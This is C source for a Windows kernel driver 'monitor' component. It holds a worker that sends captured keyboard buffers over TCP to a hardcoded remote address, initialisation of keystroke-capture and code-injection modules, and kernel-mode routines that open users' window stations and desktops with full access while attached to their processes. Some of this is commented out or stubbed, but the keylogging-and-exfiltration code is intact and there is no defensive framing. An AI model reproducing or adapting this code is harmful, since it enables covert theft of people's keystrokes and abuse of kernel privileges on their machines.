#include <inc/klogger.h>
#include <inc/monitor.h>
#include <h/drvioctl.h>
#include <inc/ntapiex.h>
#include <inc/processtable.h>
#include <inc/sslclient.h>
#include <inc/sockets.h>

#define __SUBCOMPONENT__ "ecore"

static MONITOR g_Monitor;

NTSTATUS MonitorSendKbdBufWorker(PKBD_BUFF_ENTRY BuffEntry)
{
	NTSTATUS Status;
	SOCKADDR_IN LocalAddress;
	SOCKADDR_IN RemoteAddress;
	PMSOCKET Socket = NULL;
	UNICODE_STRING NodeName = RTL_CONSTANT_STRING(L"10.30.16.93");
	UNICODE_STRING ServiceName = RTL_CONSTANT_STRING(L"40008");
	UNICODE_STRING RemoteName = { 0, 0, NULL };
	PMONITOR Monitor = MonitorGetInstance();

	IN4ADDR_SETANY(&LocalAddress);

	Status = MWskResolveName(
		Monitor->WskContext,
		&NodeName,
		&ServiceName,
		NULL,
		&RemoteAddress
		);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskResolveName error %x for name %wZ %wZ", Status, &NodeName, &ServiceName);
		goto cleanup;
	}

	Status = MWskSockAddrToStr(&RemoteAddress, &RemoteName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSockAddrToStr failure %x", Status);
		goto cleanup;
	}

	//KLog(LInfo, "Remote name %ws", RemoteName.Buffer);

	Status = MWskSocketConnect(Monitor->WskContext, SOCK_STREAM, IPPROTO_TCP, (PSOCKADDR)&LocalAddress, (PSOCKADDR)&RemoteAddress, &Socket);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSocketConnect error %x", Status);
		goto cleanup;
	}

	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed, NULL);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSendAll error %x", Status);
	}

cleanup:
    if (RemoteName.Buffer != NULL) {
        ExFreePool(RemoteName.Buffer);
    }

    if (Socket != NULL)
        MWskSocketRelease(Socket);

	KbdBuffDelete(BuffEntry);

	return Status;
}

VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
{
	KLog(LInfo, "MonitorSendKbdBuf EMPTY!!!");
//	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
}

PMONITOR
	MonitorGetInstance(VOID)
{
	return &g_Monitor;
}

VOID
	MonitorInitInternal(PMONITOR Monitor, PDRIVER_OBJECT DriverObject)
{
	Monitor->DriverObject = DriverObject;
	KeInitializeGuardedMutex(&Monitor->Mutex);

	SysWorkerInit(&Monitor->NetWorker);
	SysWorkerInit(&Monitor->RequestWorker);

	InjectInit(&Monitor->Inject);
	ProcessTableInit(&Monitor->ProcessTable);
	KbdInit(&Monitor->Kbd);

	Monitor->State = MONITOR_STATE_STOPPED;
}

NTSTATUS
    MonitorStartInternal(PMONITOR Monitor)
{
    NTSTATUS Status;

	KeAcquireGuardedMutex(&Monitor->Mutex);
	if (Monitor->State == MONITOR_STATE_STARTED) {
		KLog(LError, "Monitor already started");
		KeReleaseGuardedMutex(&Monitor->Mutex);
		return STATUS_TOO_LATE;
	}

	if (0 != sock_init()) {
		KLog(LError, "sock_init failed");
		goto start_failed;
	}

	Status = ServerConPoolStart(&Monitor->ConPool, 2);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ServerConPoolStart failed err=%x", Status);
		goto start_failed;
	}

	Status = ProcessTableStart(&Monitor->ProcessTable);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ProcessTableStart failed err=%x", Status);
		goto start_failed;
	}

	Monitor->WskContext = MWskCreate();
    if (Monitor->WskContext == NULL) {
        KLog(LError, "MWskCreate failed");
		goto start_failed;
    }

	Status = SysWorkerStart(&Monitor->NetWorker);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SysWorkerStart failed err=%x", Status);
		goto start_failed;
	}

	Status = SysWorkerStart(&Monitor->RequestWorker);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SysWorkerStart failed err=%x", Status);
		goto start_failed;
	}
	/*
	Status = InjectStart(&Monitor->Inject);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "InjectStart failed err=%x", Status);
		goto start_failed;
	}

	Status = KbdStart(&Monitor->Kbd);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "KbdStart failed err=%x", Status);
		goto start_failed;
	}
	*/
	Monitor->State = MONITOR_STATE_STARTED;
	KeReleaseGuardedMutex(&Monitor->Mutex);

	return STATUS_SUCCESS;

start_failed:
	KbdStop(&Monitor->Kbd);
	InjectStop(&Monitor->Inject);
	SysWorkerStop(&Monitor->RequestWorker);
	SysWorkerStop(&Monitor->NetWorker);

	ProcessTableStop(&Monitor->ProcessTable);

	ServerConPoolStop(&Monitor->ConPool);
	sock_release();

	if (Monitor->WskContext != NULL) {
		MWskRelease(Monitor->WskContext);
		Monitor->WskContext = NULL;
	}
	
	Monitor->State = MONITOR_STATE_STOPPED;

	KeReleaseGuardedMutex(&Monitor->Mutex);

    return Status;
}

NTSTATUS
	MonitorStopInternal(PMONITOR Monitor)
{
	KeAcquireGuardedMutex(&Monitor->Mutex);
	if (Monitor->State == MONITOR_STATE_STOPPED) {
		KLog(LError, "Monitor already stopped");
		KeReleaseGuardedMutex(&Monitor->Mutex);
		return STATUS_TOO_LATE;
	}
	/*
	KbdStop(&Monitor->Kbd);
	InjectStop(&Monitor->Inject);
	*/
	SysWorkerStop(&Monitor->RequestWorker);
	SysWorkerStop(&Monitor->NetWorker);

	ProcessTableStop(&Monitor->ProcessTable);
	ServerConPoolStop(&Monitor->ConPool);
	sock_release();

	if (Monitor->WskContext != NULL) {
		MWskRelease(Monitor->WskContext);
		Monitor->WskContext = NULL;
	}

	Monitor->State = MONITOR_STATE_STOPPED;
	KeReleaseGuardedMutex(&Monitor->Mutex);

	return STATUS_SUCCESS;
}

NTSTATUS
    MonitorStart()
{   
    KLog(LInfo, "MonitorStart");

	return MonitorStartInternal(&g_Monitor);
}

NTSTATUS
    MonitorStop()
{
    KLog(LInfo, "MonitorStop");

    return MonitorStopInternal(&g_Monitor);
}

VOID
	MonitorInit(PDRIVER_OBJECT DriverObject)
{
	MonitorInitInternal(&g_Monitor, DriverObject);
}


NTSTATUS MonitorOpenWinstaWorker(POPEN_WINSTA OpenWinsta)
{
	WCHAR FullObjName[0x100];
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING usFullObjName;
	BOOLEAN bProcAcquired = FALSE;
	KAPC_STATE ApcState;

	Status = RtlStringCchPrintfW(FullObjName, RTL_NUMBER_OF(FullObjName), L"\\sessions\\%d\\windows\\windowstations\\%ws", PsGetProcessSessionId(OpenWinsta->Process), OpenWinsta->WinstaName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "RtlStringCchPrintfW failed err=%x", Status);
		goto cleanup;
	}

	RtlInitUnicodeString(&usFullObjName, FullObjName);

	InitializeObjectAttributes(&ObjectAttributes,
		&usFullObjName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
		);

	Status = PsAcquireProcessExitSynchronization(OpenWinsta->Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, error=%x", OpenWinsta->Process, Status);
		goto cleanup;
	}
	bProcAcquired = TRUE;

	KeEnterGuardedRegion();
	KeStackAttachProcess(OpenWinsta->Process, &ApcState);
	
	Status = ObOpenObjectByName(
		&ObjectAttributes,
		*ExWindowStationObjectType,
		KernelMode,
		NULL,
		GENERIC_ALL,
		NULL,
		&OpenWinsta->hWinsta);
	
	KeUnstackDetachProcess(&ApcState);
	KeLeaveGuardedRegion();

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ObOpenObjectByName for name=%wZ failed err=%x", &usFullObjName, Status);
		goto cleanup;
	}

	Status = STATUS_SUCCESS;
	KLog(LInfo, "ObOpenObjectByName for name=%wZ, SUCCESS handle=%p, process=%p", &usFullObjName, OpenWinsta->hWinsta, OpenWinsta->Process);

cleanup:
	if (bProcAcquired)
		PsReleaseProcessExitSynchronization(OpenWinsta->Process);
	
	OpenWinsta->Error = RtlNtStatusToDosError(Status);

	return STATUS_SUCCESS;
}

NTSTATUS MonitorOpenDesktopWorker(POPEN_DESKTOP OpenDesktop)
{
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING usObjName;
	BOOLEAN bProcAcquired = FALSE;
	KAPC_STATE ApcState;

	RtlInitUnicodeString(&usObjName, OpenDesktop->DesktopName);

	InitializeObjectAttributes(&ObjectAttributes,
		&usObjName,
		OBJ_CASE_INSENSITIVE,
		OpenDesktop->hWinsta,
		NULL
		);

	Status = PsAcquireProcessExitSynchronization(OpenDesktop->Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, error=%x", OpenDesktop->Process, Status);
		goto cleanup;
	}
	bProcAcquired = TRUE;

	KeEnterGuardedRegion();
	KeStackAttachProcess(OpenDesktop->Process, &ApcState);

	Status = ObOpenObjectByName(
		&ObjectAttributes,
		*ExDesktopObjectType,
		KernelMode,
		NULL,
		GENERIC_ALL,
		NULL,
		&OpenDesktop->hDesktop);

	KeUnstackDetachProcess(&ApcState);
	KeLeaveGuardedRegion();

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ObOpenObjectByName for name=%wZ failed err=%x", &usObjName, Status);
		goto cleanup;
	}

	Status = STATUS_SUCCESS;
	KLog(LInfo, "ObOpenObjectByName for name=%wZ, SUCCESS handle=%p, process=%p", &usObjName, OpenDesktop->hDesktop, OpenDesktop->Process);

cleanup:
	if (bProcAcquired)
		PsReleaseProcessExitSynchronization(OpenDesktop->Process);

	OpenDesktop->Error = RtlNtStatusToDosError(Status);

	return STATUS_SUCCESS;
}

NTSTATUS
MonitorOpenDesktop(POPEN_DESKTOP openDesktop)
{
	PSYS_WRK_ITEM WrkItem = NULL;
	NTSTATUS Status;

	openDesktop->hDesktop = NULL;
	openDesktop->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);

	openDesktop->Process = PsGetCurrentProcess();
	ObReferenceObject(openDesktop->Process);

	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenDesktopWorker, openDesktop);
	if (WrkItem == NULL) {
		KLog(LError, "Cant queue wrk item");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
	SYS_WRK_ITEM_DEREF(WrkItem)

	Status = STATUS_SUCCESS;

cleanup:
	ObDereferenceObject(openDesktop->Process);
	openDesktop->Process = NULL;

	return Status;
}

NTSTATUS
	MonitorOpenWinsta(POPEN_WINSTA openWinsta)
{
	PSYS_WRK_ITEM WrkItem = NULL;
	NTSTATUS Status;

	openWinsta->hWinsta = NULL;
	openWinsta->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);

	openWinsta->Process = PsGetCurrentProcess();
	ObReferenceObject(openWinsta->Process);

	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenWinstaWorker, openWinsta);
	if (WrkItem == NULL) {
		KLog(LError, "Cant queue wrk item");
		Status = STATUS_UNSUCCESSFUL;
		goto cleanup;
	}

	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
	SYS_WRK_ITEM_DEREF(WrkItem)

	Status = STATUS_SUCCESS;

cleanup:
	ObDereferenceObject(openWinsta->Process);
	openWinsta->Process = NULL;

	return Status;
}